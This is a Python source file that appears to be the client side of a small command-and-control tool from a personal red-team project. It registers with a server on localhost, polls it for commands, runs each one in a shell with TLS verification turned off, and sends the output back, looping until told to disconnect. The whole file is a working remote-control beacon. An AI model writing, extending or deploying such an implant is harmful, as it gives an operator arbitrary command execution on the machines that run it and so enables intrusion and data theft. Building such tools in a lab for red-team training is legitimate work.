import requests
import subprocess
import time

SERVER_URL = "http://127.0.0.1:5005"
CLIENT_ID = None

# client reaches out to server to get told its ID
def register():
    ip = subprocess.run("ifconfig | grep 129 | grep inet | awk '{print $2}'", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip() # get ip
    # add stuff to account for distro (hostname -I)
    # response = requests.get(f"{SERVER_URL}/log-client", params={'client_id': ip}, verify='/Users/leahk/workspace/projects/redteam/C2/cert.pem') # send ip
    response = requests.get(f"{SERVER_URL}/register-client", params={'client_id': ip}, verify=False)
    if response.status_code == 200:
        return response.json()['client_id'] # need server to return to the client what its ID is
    else:
        return None

def get_command():
    response = requests.get(f"{SERVER_URL}/command", params={'client_id': CLIENT_ID}, verify=False) # GET command from server
    if response.status_code == 200: # if request was successful
        cmd = response.json().get('command')
        return cmd
    return None

def execute_command(cmd):
    # try:
    result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) # execute shell command in a subprocess
    return result.stdout.decode() + result.stderr.decode() # decode standard output
    # except subprocess.CalledProcessError as e: # umm uhh
    #     return str(e)

def main():
    # client_id = log_client()
    # print("!!!!!!!!!!CLIENT ID:", client_id)
    try:
        CLIENT_ID = register()
        print("!!!!!!!!!!CLIENT ID:", CLIENT_ID) # get id by visiting server/log-client, which means that server runs log_client() and gives client an id
        while True:
            cmd = get_command()
            if cmd == "disconnect":
                print(f"client {CLIENT_ID} disconnected")
                requests.post(SERVER_URL, params={'client_id': CLIENT_ID, 'status': 'disconnected'}) # this works too
                break
            result = execute_command(cmd)
            requests.post(SERVER_URL, json={"result": result}, params={'client': CLIENT_ID, 'status': 'connected'}) # this goes hard
            print("hi from client")
            time.sleep(10)
    except:
        print("*crickets*")

if __name__ == "__main__":
    main()